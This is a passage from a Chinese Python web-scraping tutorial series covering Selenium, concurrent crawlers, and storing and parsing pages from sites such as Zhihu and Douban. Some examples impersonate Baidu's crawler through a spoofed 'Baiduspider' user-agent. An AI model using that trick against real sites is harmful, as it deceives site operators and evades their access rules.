JavaScript逆向工程下面我们以“360图片”网站为例，说明什么是JavaScript逆向工程。其实所谓的JavaScript逆向工程就是找到通过Ajax技术动态获取数据的接口。在浏览器中输入http://image.so.com/z?ch=beauty就可以打开“360图片”的“美女”版块，如下图所示。 但是当我们在浏览器中通过右键菜单“显示网页源代码”的时候，居然惊奇的发现页面的HTML代码中连一个&lt;img&gt;标签都没有，那么我们看到的图片是怎么显示出来的呢？原来所有的图片都是通过JavaScript动态加载的，而在浏览器的“开发人员工具”的“网络”中可以找到获取这些图片数据的网络API接口，如下图所示。 那么结论就很简单了，只要我们找到了这些网络API接口，那么就能通过这些接口获取到数据，当然实际开发的时候可能还要对这些接口的参数以及接口返回的数据进行分析，了解每个参数的意义以及返回的JSON数据的格式，这样才能在我们的爬虫中使用这些数据。 使用Selenium尽管很多网站对自己的网络API接口进行了保护，增加了获取数据的难度，但是只要经过足够的努力，绝大多数还是可以被逆向工程的，但是在实际开发中，我们可以通过浏览器渲染引擎来避免这些繁琐的工作，WebKit就是一个利用的渲染引擎。 WebKit的代码始于1998年的KHTML项目，当时它是Konqueror浏览器的渲染引擎。2001年，苹果公司从这个项目的代码中衍生出了WebKit并应用于Safari浏览器，早期的Chrome浏览器也使用了该内核。在Python中，我们可以通过Qt框架获得WebKit引擎并使用它来渲染页面获得动态内容，关于这个内容请大家自行阅读《爬虫技术:动态页面抓取超级指南》一文。 如果没有打算用上面所说的方式来渲染页面并获得动态内容，其实还有一种替代方案就是使用自动化测试工具Selenium，它提供了浏览器自动化的API接口，这样就可以通过操控浏览器来获取动态内容。首先可以使用pip来安装Selenium。 pip3 install selenium 下面以“阿里V任务”的“直播服务”为例，来演示如何使用Selenium获取到动态内容并抓取主播图片。 import requests from bs4 import BeautifulSoup def main(): resp = requests.get('https://v.taobao.com/v/content/live?catetype=704&amp;from=taonvlang') soup = BeautifulSoup(resp.text, 'lxml') for img_tag in soup.select('img[src]'): print(img_tag.attrs['src']) if __name__ == '__main__': main() 运行上面的程序会发现没有任何的输出，因为页面的HTML代码上根本找不到&lt;img&gt;标签。接下来我们使用Selenium来获取到页面上的动态内容，再提取主播图片。 from bs4 import BeautifulSoup from selenium import webdriver from selenium.webdriver.common.keys import Keys def main(): driver = webdriver.Chrome() driver.get('https://v.taobao.com/v/content/live?catetype=704&amp;from=taonvlang') soup = BeautifulSoup(driver.page_source, 'lxml') for img_tag in soup.body.select('img[src]'): print(img_tag.attrs['src']) if __name__ == '__main__': main() 在上面的程序中，我们通过Selenium实现对Chrome浏览器的操控，如果要操控其他的浏览器，可以创对应的浏览器对象，例如Firefox、IE等。运行上面的程序，如果看到如下所示的错误提示，那是说明我们还没有将Chrome浏览器的驱动添加到PATH环境变量中，也没有在程序中指定Chrome浏览器驱动所在的位置。 selenium.common.exceptions.WebDriverException: Message: 'chromedriver' executable needs to be in PATH. Please see https://sites.google.com/a/chromium.org/chromedriver/home 为了解决上面的问题，可以到Selenium的官方网站找到浏览器驱动的下载链接并下载需要的驱动，在Linux或macOS系统下可以通过下面的命令来设置PATH环境变量，Windows下配置环境变量也非常简单，不清楚的可以自行了解。 export PATH=$PATH:/Users/Hao/Downloads/Tools/chromedriver/ 其中/Users/Hao/Downloads/Tools/chromedriver/ 就是chromedriver所在的路径。当然，更为简单的办法是把chromedriver直接放在虚拟环境中，跟Python解释器位于同一个路径下就可以了。 WebDriver用法详解表1. 定位页面元素的方法 表2. WebDriver的常用属性 属性 描述 current_url 当前页面的URL current_window_handle 当前窗口的句柄（引用） name WebDriver实例底层浏览器的名称 orientation 当前设备的方向（横屏、竖屏） page_source 当前页面的源代码（动态内容） title 当前页面的标题 window_handles WebDriver打开的所有窗口的句柄 表3. WebDriver的常用方法 方法 描述 back() / forward() 在浏览历史记录中后退/前进 close() / quit() 关闭当前浏览器窗口 / 退出WebDriver实例 get(url) 加载指定URL的页面到浏览器中 maximize_window() 将浏览器窗口最大化 refresh() 刷新当前页面 switch_to_active_element() 获得页面上得到焦点的元素 switch_to_alert() 把焦点切换至弹出的警告框 set_page_load_timeout(time_to_wait) 设置页面加载超时时间 set_script_timeout(time_to_wait) 设置JavaScript执行超时时间 implicit_wait(time_to_wait) 设置等待元素被找到或目标指令完成 WebElement用法表1. WebElement常用属性 表2. WebElement常用方法 Select用法Alert用法元素等待机制隐式等待显示等待高级特性鼠标和键盘事件调用JavaScript屏幕截图和录制操作Cookie","categories":[],"tags":[{"name":"解析动态内容","slug":"解析动态内容","permalink":"http://www.xiaocaibi.top/tags/%E8%A7%A3%E6%9E%90%E5%8A%A8%E6%80%81%E5%86%85%E5%AE%B9/"}]},{"title":"64.并发下载","slug":"64-并发下载","date":"2021-06-27T06:38:07.000Z","updated":"2021-09-20T08:47:43.760Z","comments":true,"path":"posts/d201ae53.html","link":"","permalink":"http://www.xiaocaibi.top/posts/d201ae53.html","excerpt":"","text":"并发下载多线程和多进程补充知识点threading.local类使用线程时最不愿意遇到的情况就是多个线程竞争资源，在这种情况下为了保证资源状态的正确性，我们可能需要对资源进行加锁保护的处理，这一方面会导致程序失去并发性，另外如果多个线程竞争多个资源时，还有可能因为加锁方式的不当导致死锁。要解决多个线程竞争资源的问题，其中一个方案就是让每个线程都持有资源的副本（拷贝），这样每个线程可以操作自己所持有的资源，从而规避对资源的竞争。 要实现将资源和持有资源的线程进行绑定的操作，最简单的做法就是使用threading模块的local类，在网络爬虫开发中，就可以使用local类为每个线程绑定一个MySQL数据库连接或Redis客户端对象，这样通过线程可以直接获得这些资源，既解决了资源竞争的问题，又避免了在函数和方法调用时传递这些资源。具体的请参考本章多线程爬取“手机搜狐网”（Redis版）的实例代码。 concurrent.futures模块Python3.2带来了concurrent.futures&nbsp;模块，这个模块包含了线程池和进程池、管理并行编程任务、处理非确定性的执行流程、进程/线程同步等功能。关于这部分的内容推荐大家阅读《Python并行编程》。 分布式进程使用多进程的时候，可以将进程部署在多个主机节点上，Python的multiprocessing模块不但支持多进程，其中managers子模块还支持把多进程部署到多个节点上。当然，要部署分布式进程，首先需要一个服务进程作为调度者，进程之间通过网络进行通信来实现对进程的控制和调度，由于managers模块已经对这些做出了很好的封装，因此在无需了解网络通信细节的前提下，就可以编写分布式多进程应用。具体的请参照本章分布式多进程爬取“手机搜狐网”的实例代码。 协程和异步I/O协程的概念协程（coroutine）通常又称之为微线程或纤程，它是相互协作的一组子程序（函数）。所谓相互协作指的是在执行函数A时，可以随时中断去执行函数B，然后又中断继续执行函数A。注意，这一过程并不是函数调用（因为没有调用语句），整个过程看似像多线程，然而协程只有一个线程执行。协程通过yield关键字和 send()操作来转移执行权，协程之间不是调用者与被调用者的关系。 协程的优势在于以下两点： 执行效率极高，因为子程序（函数）切换不是线程切换，由程序自身控制，没有切换线程的开销。 不需要多线程的锁机制，因为只有一个线程，也不存在竞争资源的问题，当然也就不需要对资源加锁保护，因此执行效率高很多。 说明：协程适合处理的是I/O密集型任务，处理CPU密集型任务并不是它擅长的，如果要提升CPU的利用率可以考虑“多进程+多线程”或者“多进程+协程”的工作模式。 历史回顾 Python 2.2：第一次提出了生成器（最初称之为迭代器）的概念（PEP 255）。 Python 2.5：引入了将对象发送回暂停了的生成器这一特性即生成器的send()方法（PEP 342）。 Python 3.3：添加了yield from特性，允许从迭代器中返回任何值（注意生成器本身也是迭代器），这样我们就可以串联生成器并且重构出更好的生成器。 Python 3.4：引入asyncio.coroutine装饰器用来标记作为协程的函数，协程函数和asyncio及其事件循环一起使用，来实现异步I/O操作。 Python 3.5：引入了async和await，可以使用async def来定义一个协程函数，这个函数中不能包含任何形式的yield语句，但是可以使用return或await从协程中返回值。 协程实现了协作式并发，通过提高CPU的利用率来达到改善性能的目的。著名的三方库aiohttp就是通过协程的方式实现了HTTP客户端和HTTP服务器的功能，较之requests有更好的获取数据的性能，有兴趣可以阅读它的官方文档。 import asyncio import aiohttp async def download(url): print('Fetch:', url) async with aiohttp.ClientSession() as session: async with session.get(url, ssl=False) as resp: print(url, '---&gt;', resp.status) print(url, '---&gt;', resp.headers) print('\\n\\n', await resp.text()) def main(): loop = asyncio.get_event_loop() urls = [ 'https://www.baidu.com', 'http://www.sohu.com/', 'http://www.sina.com.cn/', 'https://www.taobao.com/', 'http://jd.com/' ] tasks = [download(url) for url in urls] loop.run_until_complete(asyncio.wait(tasks)) loop.close() if __name__ == '__main__': main() 实例 - 多线程爬取“手机搜狐网”所有页面下面我们把之间讲的所有知识结合起来，用面向对象的方式实现一个爬取“手机搜狐网”的多线程爬虫。 import pickle import zlib from enum import Enum, unique from hashlib import sha1 from random import random from threading import Thread, current_thread, local from time import sleep from urllib.parse import urlparse import pymongo import redis import requests from bs4 import BeautifulSoup from bson import Binary @unique class SpiderStatus(Enum): IDLE = 0 WORKING = 1 def decode_page(page_bytes, charsets=('utf-8',)): page_html = None for charset in charsets: try: page_html = page_bytes.decode(charset) break except UnicodeDecodeError: pass return page_html class Retry(object): def __init__(self, *, retry_times=3, wait_secs=5, errors=(Exception, )): self.retry_times = retry_times self.wait_secs = wait_secs self.errors = errors def __call__(self, fn): def wrapper(*args, **kwargs): for _ in range(self.retry_times): try: return fn(*args, **kwargs) except self.errors as e: print(e) sleep((random() + 1) * self.wait_secs) return None return wrapper class Spider(object): def __init__(self): self.status = SpiderStatus.IDLE @Retry() def fetch(self, current_url, *, charsets=('utf-8', ), user_agent=None, proxies=None): thread_name = current_thread().name print(f'[{thread_name}]: {current_url}') headers = {'user-agent': user_agent} if user_agent else {} resp = requests.get(current_url, headers=headers, proxies=proxies) return decode_page(resp.content, charsets) \\ if resp.status_code == 200 else None def parse(self, html_page, *, domain='m.sohu.com'): soup = BeautifulSoup(html_page, 'lxml') for a_tag in soup.body.select('a[href]'): parser = urlparse(a_tag.attrs['href']) scheme = parser.scheme or 'http' netloc = parser.netloc or domain if scheme != 'javascript' and netloc == domain: path = parser.path query = '?' + parser.query if parser.query else '' full_url = f'{scheme}://{netloc}{path}{query}' redis_client = thread_local.redis_client if not redis_client.sismember('visited_urls', full_url): redis_client.rpush('m_sohu_task', full_url) def extract(self, html_page): pass def store(self, data_dict): # redis_client = thread_local.redis_client # mongo_db = thread_local.mongo_db pass class SpiderThread(Thread): def __init__(self, name, spider): super().__init__(name=name, daemon=True) self.spider = spider def run(self): redis_client = redis.Redis(host='1.2.3.4', port=6379, password='1qaz2wsx') mongo_client = pymongo.MongoClient(host='1.2.3.4', port=27017) thread_local.redis_client = redis_client thread_local.mongo_db = mongo_client.msohu while True: current_url = redis_client.lpop('m_sohu_task') while not current_url: current_url = redis_client.lpop('m_sohu_task') self.spider.status = SpiderStatus.WORKING current_url = current_url.decode('utf-8') if not redis_client.sismember('visited_urls', current_url): redis_client.sadd('visited_urls', current_url) html_page = self.spider.fetch(current_url) if html_page not in [None, '']: hasher = hasher_proto.copy() hasher.update(current_url.encode('utf-8')) doc_id = hasher.hexdigest() sohu_data_coll = mongo_client.msohu.webpages if not sohu_data_coll.find_one({'_id': doc_id}): sohu_data_coll.insert_one({ '_id': doc_id, 'url': current_url, 'page': Binary(zlib.compress(pickle.dumps(html_page))) }) self.spider.parse(html_page) self.spider.status = SpiderStatus.IDLE def is_any_alive(spider_threads): return any([spider_thread.spider.status == SpiderStatus.WORKING for spider_thread in spider_threads]) thread_local = local() hasher_proto = sha1() def main(): redis_client = redis.Redis(host='1.2.3.4', port=6379, password='1qaz2wsx') if not redis_client.exists('m_sohu_task'): redis_client.rpush('m_sohu_task', 'http://m.sohu.com/') spider_threads = [SpiderThread('thread-%d' % i, Spider()) for i in range(10)] for spider_thread in spider_threads: spider_thread.start() while redis_client.exists('m_sohu_task') or is_any_alive(spider_threads): sleep(5) print('Over!') if __name__ == '__main__': main()","categories":[],"tags":[{"name":"并发下载","slug":"并发下载","permalink":"http://www.xiaocaibi.top/tags/%E5%B9%B6%E5%8F%91%E4%B8%8B%E8%BD%BD/"}]},{"title":"63.存储数据","slug":"63-存储数据","date":"2021-06-27T06:37:21.000Z","updated":"2021-09-20T08:47:43.760Z","comments":true,"path":"posts/5c5c1ad0.html","link":"","permalink":"http://www.xiaocaibi.top/posts/5c5c1ad0.html","excerpt":"","text":"存储数据存储海量数据数据持久化的首选方案应该是关系型数据库，关系型数据库的产品很多，包括：Oracle、MySQL、SQLServer、PostgreSQL等。如果要存储海量的低价值数据，文档数据库也是不错的选择，MongoDB是文档数据库中的佼佼者，有兴趣的读者可以自行研究。 下面的代码演示了如何使用MySQL来保存从知乎发现上爬取到的链接和页面。 create database zhihu default charset utf8; create user 'hellokitty'@'%' identified by 'Hellokitty.618'; grant all privileges on zhihu.* to 'hellokitty'@'%'; flush privileges; use zhihu; create table `tb_explore` ( `id` integer auto_increment, `url` varchar(1024) not null, `page` longblob not null, `digest` char(48) unique not null, `idate` datetime default now(), primary key (`id`) ); import hashlib import pickle import re import zlib from urllib.parse import urljoin import MySQLdb import bs4 import requests conn = MySQLdb.connect(host='1.2.3.4', port=3306, user='hellokitty', password='Hellokitty.618', database='zhihu', charset='utf8', autocommit=True) def write_to_db(url, page, digest): try: with conn.cursor() as cursor: cursor.execute( 'insert into tb_explore (url, page, digest) values (%s, %s, %s) ', (url, page, digest) ) except MySQLdb.MySQLError as err: print(err) def main(): base_url = 'https://www.zhihu.com/' seed_url = urljoin(base_url, 'explore') headers = {'user-agent': 'Baiduspider'} try: resp = requests.get(seed_url, headers=headers) soup = bs4.BeautifulSoup(resp.text, 'lxml') href_regex = re.compile(r'^/question') for a_tag in soup.find_all('a', {'href': href_regex}): href = a_tag.attrs['href'] full_url = urljoin(base_url, href) digest = hashlib.sha1(full_url.encode()).hexdigest() html_page = requests.get(full_url, headers=headers).text zipped_page = zlib.compress(pickle.dumps(html_page)) write_to_db(full_url, zipped_page, digest) finally: conn.close() if __name__ == '__main__': main() 数据缓存通过《网络数据采集和解析》一文，我们已经知道了如何从指定的页面中抓取数据，以及如何保存抓取的结果，但是我们没有考虑过这么一种情况，就是我们可能需要从已经抓取过的页面中提取出更多的数据，重新去下载这些页面对于规模不大的网站倒是问题也不大，但是如果能够把这些页面缓存起来，对应用的性能会有明显的改善。下面的例子演示了如何使用Redis来缓存知乎发现上的页面。 import hashlib import pickle import re import zlib from urllib.parse import urljoin import bs4 import redis import requests def main(): base_url = 'https://www.zhihu.com/' seed_url = urljoin(base_url, 'explore') client = redis.Redis(host='1.2.3.4', port=6379, password='1qaz2wsx') headers = {'user-agent': 'Baiduspider'} resp = requests.get(seed_url, headers=headers) soup = bs4.BeautifulSoup(resp.text, 'lxml') href_regex = re.compile(r'^/question') for a_tag in soup.find_all('a', {'href': href_regex}): href = a_tag.attrs['href'] full_url = urljoin(base_url, href) field_key = hashlib.sha1(full_url.encode()).hexdigest() if not client.hexists('spider:zhihu:explore', field_key): html_page = requests.get(full_url, headers=headers).text zipped_page = zlib.compress(pickle.dumps(html_page)) client.hset('spider:zhihu:explore', field_key, zipped_page) print('Total %d question pages found.' % client.hlen('spider:zhihu:explore')) if __name__ == '__main__': main()","categories":[],"tags":[{"name":"存储数据","slug":"存储数据","permalink":"http://www.xiaocaibi.top/tags/%E5%AD%98%E5%82%A8%E6%95%B0%E6%8D%AE/"}]},{"title":"62.数据采集和解析","slug":"62-数据采集和解析","date":"2021-06-27T06:36:22.000Z","updated":"2021-09-20T08:47:43.744Z","comments":true,"path":"posts/11ad9b4a.html","link":"","permalink":"http://www.xiaocaibi.top/posts/11ad9b4a.html","excerpt":"","text":"数据采集和解析通过上一个章节的讲解，我们已经了解到了开发一个爬虫需要做的工作以及一些常见的问题，下面我们给出一个爬虫开发相关技术的清单以及这些技术涉及到的标准库和第三方库，稍后我们会一一介绍这些内容。 下载数据 - urllib / requests / aiohttp / httpx。 解析数据 - re / lxml / beautifulsoup4 / pyquery。 缓存和持久化 - mysqlclient / sqlalchemy / peewee / redis / pymongo。 生成数字签名 - hashlib。 序列化和压缩 - pickle / json / zlib。 调度器 - multiprocessing / threading / concurrent.futures。 HTML页面&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Home&lt;/title&gt; &lt;style type=\"text/css\"&gt; /* 此处省略层叠样式表代码 */ &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=\"wrapper\"&gt; &lt;header&gt; &lt;h1&gt;Yoko's Kitchen&lt;/h1&gt; &lt;nav&gt; &lt;ul&gt; &lt;li&gt;&lt;a href=\"\" class=\"current\"&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;Classes&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;Catering&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;About&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;Contact&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/nav&gt; &lt;/header&gt; &lt;section class=\"courses\"&gt; &lt;article&gt; &lt;figure&gt; &lt;img src=\"images/bok-choi.jpg\" alt=\"Bok Choi\" /&gt; &lt;figcaption&gt;Bok Choi&lt;/figcaption&gt; &lt;/figure&gt; &lt;hgroup&gt; &lt;h2&gt;Japanese Vegetarian&lt;/h2&gt; &lt;h3&gt;Five week course in London&lt;/h3&gt; &lt;/hgroup&gt; &lt;p&gt;A five week introduction to traditional Japanese vegetarian meals, teaching you a selection of rice and noodle dishes.&lt;/p&gt; &lt;/article&gt; &lt;article&gt; &lt;figure&gt; &lt;img src=\"images/teriyaki.jpg\" alt=\"Teriyaki sauce\" /&gt; &lt;figcaption&gt;Teriyaki Sauce&lt;/figcaption&gt; &lt;/figure&gt; &lt;hgroup&gt; &lt;h2&gt;Sauces Masterclass&lt;/h2&gt; &lt;h3&gt;One day workshop&lt;/h3&gt; &lt;/hgroup&gt; &lt;p&gt;An intensive one-day course looking at how to create the most delicious sauces for use in a range of Japanese cookery.&lt;/p&gt; &lt;/article&gt; &lt;/section&gt; &lt;aside&gt; &lt;section class=\"popular-recipes\"&gt; &lt;h2&gt;Popular Recipes&lt;/h2&gt; &lt;a href=\"\"&gt;Yakitori (grilled chicken)&lt;/a&gt; &lt;a href=\"\"&gt;Tsukune (minced chicken patties)&lt;/a&gt; &lt;a href=\"\"&gt;Okonomiyaki (savory pancakes)&lt;/a&gt; &lt;a href=\"\"&gt;Mizutaki (chicken stew)&lt;/a&gt; &lt;/section&gt; &lt;section class=\"contact-details\"&gt; &lt;h2&gt;Contact&lt;/h2&gt; &lt;p&gt;Yoko's Kitchen&lt;br&gt; 27 Redchurch Street&lt;br&gt; Shoreditch&lt;br&gt; London E2 7DP&lt;/p&gt; &lt;/section&gt; &lt;/aside&gt; &lt;footer&gt; &amp;copy; 2011 Yoko's Kitchen &lt;/footer&gt; &lt;/div&gt; &lt;script&gt; /* 此处省略JavaScript代码 */ &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 如上所示的HTML页面通常由三部分构成，分别是用来承载内容的Tag（标签）、负责渲染页面的CSS（层叠样式表）以及控制交互式行为的JavaScript。通常，我们可以在浏览器的右键菜单中通过“查看网页源代码”的方式获取网页的代码并了解页面的结构；当然，我们也可以通过浏览器提供的开发人员工具来了解更多的信息。 使用requests获取页面在上一节课的代码中我们使用了三方库requests来获取页面，下面我们对requests库的用法做进一步说明。 GET请求和POST请求。 import requests resp = requests.get('http://www.baidu.com/index.html') print(resp.status_code) print(resp.headers) print(resp.cookies) print(resp.content.decode('utf-8')) resp = requests.post('http://httpbin.org/post', data={'name': 'Hao', 'age': 40}) print(resp.text) data = resp.json() print(type(data)) URL参数和请求头。 resp = requests.get( url='https://movie.douban.com/top250', headers={ 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) ' 'AppleWebKit/537.36 (KHTML, like Gecko) ' 'Chrome/83.0.4103.97 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;' 'q=0.9,image/webp,image/apng,*/*;' 'q=0.8,application/signed-exchange;v=b3;q=0.9', 'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8', } ) print(resp.status_code) 复杂的POST请求（文件上传）。 resp = requests.post( url='http://httpbin.org/post', files={'file': open('data.xlsx', 'rb')} ) print(resp.text) 操作Cookie。 cookies = {'key1': 'value1', 'key2': 'value2'} resp = requests.get('http://httpbin.org/cookies', cookies=cookies) print(resp.text) jar = requests.cookies.RequestsCookieJar() jar.set('tasty_cookie', 'yum', domain='httpbin.org', path='/cookies') jar.set('gross_cookie', 'blech', domain='httpbin.org', path='/elsewhere') resp = requests.get('http://httpbin.org/cookies', cookies=jar) print(resp.text) 设置代理服务器。 requests.get('https://www.taobao.com', proxies={ 'http': 'http://10.10.1.10:3128', 'https': 'http://10.10.1.10:1080', }) 说明：关于requests库的相关知识，还是强烈建议大家自行阅读它的官方文档。 设置请求超时。 requests.get('https://github.com', timeout=10) 页面解析几种解析方式的比较 解析方式 对应的模块 速度 使用难度 备注 正则表达式解析 re 快 困难 常用正则表达式在线正则表达式测试 XPath解析 lxml 快 一般 需要安装C语言依赖库唯一支持XML的解析器 CSS选择器解析 bs4 / pyquery 不确定 简单 说明：BeautifulSoup可选的解析器包括：Python标准库中的html.parser、lxml的HTML解析器、lxml的XML解析器和html5lib。 使用正则表达式解析页面如果你对正则表达式没有任何的概念，那么推荐先阅读《正则表达式30分钟入门教程》，然后再阅读我们之前讲解在Python中如何使用正则表达式一文。 下面的例子演示了如何用正则表达式解析“豆瓣电影Top250”中的中文电影名称。 import random import re import time import requests PATTERN = re.compile(r'&lt;a[^&gt;]*?&gt;\\s*&lt;span class=\"title\"&gt;(.*?)&lt;/span&gt;') for page in range(10): resp = requests.get( url=f'https://movie.douban.com/top250?start={page * 25}', headers={ 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) ' 'AppleWebKit/537.36 (KHTML, like Gecko) ' 'Chrome/83.0.4103.97 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;' 'q=0.9,image/webp,image/apng,*/*;' 'q=0.8,application/signed-exchange;v=b3;q=0.9', 'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8', }, ) items = PATTERN.findall(resp.text) for item in items: print(item) time.sleep(random.randint(1, 5)) XPath解析和lxmlXPath是在XML文档中查找信息的一种语法，它使用路径表达式来选取XML文档中的节点或者节点集。这里所说的XPath节点包括元素、属性、文本、命名空间、处理指令、注释、根节点等。 &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;bookstore&gt; &lt;book&gt; &lt;title lang=\"eng\"&gt;Harry Potter&lt;/title&gt; &lt;price&gt;29.99&lt;/price&gt; &lt;/book&gt; &lt;book&gt; &lt;title lang=\"zh\"&gt;三国演义&lt;/title&gt; &lt;price&gt;39.95&lt;/price&gt; &lt;/book&gt; &lt;/bookstore&gt; 对于上面的XML文件，我们可以用如下所示的XPath语法获取文档中的节点。 路径表达式 结果 bookstore 选取 bookstore 元素的所有子节点。 /bookstore 选取根元素 bookstore。注释：假如路径起始于正斜杠( / )，则此路径始终代表到某元素的绝对路径！ bookstore/book 选取属于 bookstore 的子元素的所有 book 元素。 //book 选取所有 book 子元素，而不管它们在文档中的位置。 bookstore//book 选择属于 bookstore 元素的后代的所有 book 元素，而不管它们位于 bookstore 之下的什么位置。 //@lang 选取名为 lang 的所有属性。 在使用XPath语法时，还可以使用XPath中的谓词。 路径表达式 结果 /bookstore/book[1] 选取属于 bookstore 子元素的第一个 book 元素。 /bookstore/book[last()] 选取属于 bookstore 子元素的最后一个 book 元素。 /bookstore/book[last()-1] 选取属于 bookstore 子元素的倒数第二个 book 元素。 /bookstore/book[position()&lt;3] 选取最前面的两个属于 bookstore 元素的子元素的 book 元素。 //title[@lang] 选取所有拥有名为 lang 的属性的 title 元素。 //title[@lang=’eng’] 选取所有 title 元素，且这些元素拥有值为 eng 的 lang 属性。 /bookstore/book[price&gt;35.00] 选取 bookstore 元素的所有 book 元素，且其中的 price 元素的值须大于 35.00。 /bookstore/book[price&gt;35.00]/title 选取 bookstore 元素中的 book 元素的所有 title 元素，且其中的 price 元素的值须大于 35.00。 XPath还支持通配符用法，如下所示。 路径表达式 结果 /bookstore/* 选取 bookstore 元素的所有子元素。 //* 选取文档中的所有元素。 //title[@*] 选取所有带有属性的 title 元素。 如果要选取多个节点，可以使用如下所示的方法。 路径表达式 结果 //book/title | //book/price 选取 book 元素的所有 title 和 price 元素。 //title | //price 选取文档中的所有 title 和 price 元素。 /bookstore/book/title | //price 选取属于 bookstore 元素的 book 元素的所有 title 元素，以及文档中所有的 price 元素。 说明：上面的例子来自于菜鸟教程网站上XPath教程，有兴趣的读者可以自行阅读原文。 当然，如果不理解或者不太熟悉XPath语法，可以在Chrome浏览器中按照如下所示的方法查看元素的XPath语法。 下面的例子演示了如何用XPath解析“豆瓣电影Top250”中的中文电影名称。 from lxml import etree import requests for page in range(10): resp = requests.get( url=f'https://movie.douban.com/top250?start={page * 25}', headers={ 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) ' 'AppleWebKit/537.36 (KHTML, like Gecko) ' 'Chrome/83.0.4103.97 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;' 'q=0.9,image/webp,image/apng,*/*;' 'q=0.8,application/signed-exchange;v=b3;q=0.9', 'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8', } ) html = etree.HTML(resp.text) spans = html.xpath('/html/body/div[3]/div[1]/div/div[1]/ol/li/div/div[2]/div[1]/a/span[1]') for span in spans: print(span.text) BeautifulSoup的使用BeautifulSoup是一个可以从HTML或XML文件中提取数据的Python库。它能够通过你喜欢的转换器实现惯用的文档导航、查找、修改文档的方式。 遍历文档树 获取标签 获取标签属性 获取标签内容 获取子（孙）节点 获取父节点/祖先节点 获取兄弟节点 搜索树节点 find / find_all select_one / select 说明：更多内容可以参考BeautifulSoup的官方文档。 下面的例子演示了如何用CSS选择器解析“豆瓣电影Top250”中的中文电影名称。 import random import time import bs4 import requests for page in range(10): resp = requests.get( url=f'https://movie.douban.com/top250?start={page * 25}', headers={ 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) ' 'AppleWebKit/537.36 (KHTML, like Gecko) ' 'Chrome/83.0.4103.97 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;' 'q=0.9,image/webp,image/apng,*/*;' 'q=0.8,application/signed-exchange;v=b3;q=0.9', 'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8', }, ) soup = bs4.BeautifulSoup(resp.text, 'lxml') elements = soup.select('.info&gt;div&gt;a') for element in elements: span = element.select_one('.title') print(span.text) time.sleep(random.random() * 5) 例子 - 获取知乎发现上的问题链接import re from urllib.parse import urljoin import bs4 import requests def main(): headers = {'user-agent': 'Baiduspider'} base_url = 'https://www.zhihu.com/' resp = requests.get(urljoin(base_url, 'explore'), headers=headers) soup = bs4.BeautifulSoup(resp.text, 'lxml') href_regex = re.compile(r'^/question') links_set = set() for a_tag in soup.find_all('a', {'href': href_regex}): if 'href' in a_tag.attrs: href = a_tag.attrs['href'] full_url = urljoin(base_url, href) links_set.add(full_url) print('Total %d question pages found.' % len(links_set)) print(links_set) if __name__ == '__main__': main()","categories":[],"tags":[{"name":"数据采集和解析","slug":"数据采集和解析","permalink":"http://www.xiaocaibi.top/tags/%E6%95%B0%E6%8D%AE%E9%87%87%E9%9B%86%E5%92%8C%E8%A7%A3%E6%9E%90/"}]},{"title":"61.网络爬虫和相关工具","slug":"61-网络爬虫和相关工具","date":"2021-06-27T06:34:37.000Z","updated":"2021-12-16T01:01:20.608Z","comments":true,"path":"posts/32374681.html","link":"","permalink":"http://www.xiaocaibi.top/posts/32374681.html","excerpt":"","text":"网络爬虫和相关工具网络爬虫的概念网络爬虫（web crawler），以前经常称之为网络蜘蛛（spider），是按照一定的规则自动浏览万维网并获取信息的机器人程序（或脚本），曾经被广泛的应用于互联网搜索引擎。使用过互联网和浏览器的人都知道，网页中除了供用户阅读的文字信息之外，还包含一些超链接。网络爬虫系统正是通过网页中的超链接信息不断获得网络上的其它页面。正因如此，网络数据采集的过程就像一个爬虫或者蜘蛛在网络上漫游，所以才被形象的称为网络爬虫或者网络蜘蛛。 爬虫的应用领域在理想的状态下，所有ICP（Internet Content Provider）都应该为自己的网站提供API接口来共享它们允许其他程序获取的数据，在这种情况下爬虫就不是必需品，国内比较有名的电商平台（如淘宝、京东等）、社交平台（如腾讯微博等）等网站都提供了自己的Open API，但是这类Open API通常会对可以抓取的数据以及抓取数据的频率进行限制。对于大多数的公司而言，及时的获取行业相关数据是企业生存的重要环节之一，然而大部分企业在行业数据方面的匮乏是其与生俱来的短板，合理的利用爬虫来获取数据并从中提取出有商业价值的信息是至关重要的。当然爬虫还有很多重要的应用领域，下面列举了其中的一部分： 搜索引擎 新闻聚合 社交应用 舆情监控 行业数据 合法性和背景调研爬虫合法性探讨 网络爬虫领域目前还属于拓荒阶段，虽然互联网世界已经通过自己的游戏规则建立起一定的道德规范(Robots协议，全称是“网络爬虫排除标准”)，但法律部分还在建立和完善中，也就是说，现在这个领域暂时还是灰色地带。 “法不禁止即为许可”，如果爬虫就像浏览器一样获取的是前端显示的数据（网页上的公开信息）而不是网站后台的私密敏感信息，就不太担心法律法规的约束，因为目前大数据产业链的发展速度远远超过了法律的完善程度。 在爬取网站的时候，需要限制自己的爬虫遵守Robots协议，同时控制网络爬虫程序的抓取数据的速度；在使用数据的时候，必须要尊重网站的知识产权（从Web 